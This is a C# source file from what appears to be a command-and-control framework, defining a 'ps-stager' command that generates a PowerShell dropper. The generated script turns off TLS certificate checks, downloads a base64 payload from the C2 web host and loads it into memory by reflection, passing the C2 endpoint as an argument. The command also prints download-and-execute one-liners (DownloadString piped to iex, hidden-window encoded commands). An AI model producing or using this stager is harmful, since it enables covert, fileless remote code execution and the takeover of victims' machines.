using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using System.Text.RegularExpressions;

namespace Commander.Commands.Laucher
{
    public class BuildPSDropperCommandCommandOptions
    {
        public string endpoint { get; set; }
        public string url { get; set; }

        public string save { get; set; }

        public string fileName { get; set; }

        public bool x86 { get; set; }

        public bool raw { get; set; }

        public bool webhost { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildPSDropperCommand : EnhancedCommand<BuildPSDropperCommandCommandOptions>
    {


        public override string Category => CommandCategory.Launcher;
        public override string Description => "Create a Powershell stager script";
        public override string Name => "ps-stager";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("endpoint", "endpoint to connect to"),
            new Option<string>(new[] { "--url", "-u" }, () => null, "url to download stage from"),
            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Name of the file to be crafted"),
            new Option<string>(new[] { "--save", "-s" }, () => null, "Folder to save the generated file"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--raw", "-raw" }, "Don't base64 encode the payload"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildPSDropperCommandCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;


            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            var url = context.Options.url;
            int urlPort = 80;
            string urlProtocol = "http";
            if (string.IsNullOrEmpty(url))
            {
                if (endpoint.Protocol == ConnexionType.Http)
                {
                    url = endpoint.ToString();
                }
                else
                {   //it's a pivot webhost should be running on it
                    url = "http://" + endpoint.Address + $":{urlPort}/wh/";
                }

                context.Terminal.WriteLine($"Url was not specified, using {url} !");
            }

            try
            {
                Uri uri = new Uri(url);
                urlPort = uri.Port;
                urlProtocol = uri.Scheme.ToLower();
            }
            catch (Exception ex)
            {
                //context.Terminal.WriteLine(ex.ToString());
            }


            var outFile = context.Options.fileName;
            if (string.IsNullOrEmpty(outFile))
            {
                outFile = "stager_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_") + "_" + endpoint.Port;
            }

            if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                outFile += ".ps1";

            string outPath = Path.Combine("/tmp", outFile);
            if (!string.IsNullOrEmpty(context.Options.save))
                outPath = Path.Combine(context.Options.save, outFile);

            var fileName = "Stage1";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".b64";

            string script = string.Empty;
            if(urlProtocol == "https")
                script += "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

            script += $"$b64 = (iwr \"{url}/wh/{fileName}\" -UseBasicParsing).Content;";
            script += "$b = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($b64));";
            script += "$a = [System.Reflection.Assembly]::Load($b);";
            script += "$m = $a.GetTypes().Where({ $_.Name -eq 'Stage' }, 'First').GetMethod('Entry', [Reflection.BindingFlags] 'Static, Public, NonPublic');";
            script += $"[String[]]$prms = '{url}/wh/','{endpoint}';";
            script += $"$m.Invoke($null,$prms);";

            context.Terminal.WriteLine($"[>] Generating script...");

            var scriptb64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

            if (context.Options.raw)
                File.WriteAllText(outPath, script);
            else
                File.WriteAllText(outPath, scriptb64);

            context.Terminal.WriteInfo($"Stager can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = Encoding.UTF8.GetBytes(script);
                context.CommModule.WebHost(outFile, fileContent);

                string scurl = $"{url}/wh/{outFile}";
                context.Terminal.WriteLine($"[*] dropper hosted on : {scurl}");

                context.Terminal.WriteLine($"[+] External Script : ");

                string caller = $"(New-Object Net.WebClient).DownloadString('{scurl}') | iex";
                if (urlProtocol == "https")
                    caller = BuildStagerCommand.PowershellSSlScript + caller;
                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{caller}\"");
                string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {caller64}");
            }

            context.Terminal.WriteLine($"[+] Direct Script : ");
            context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{script}\"");
            context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {scriptb64}");

            return true;
        }
    }

}
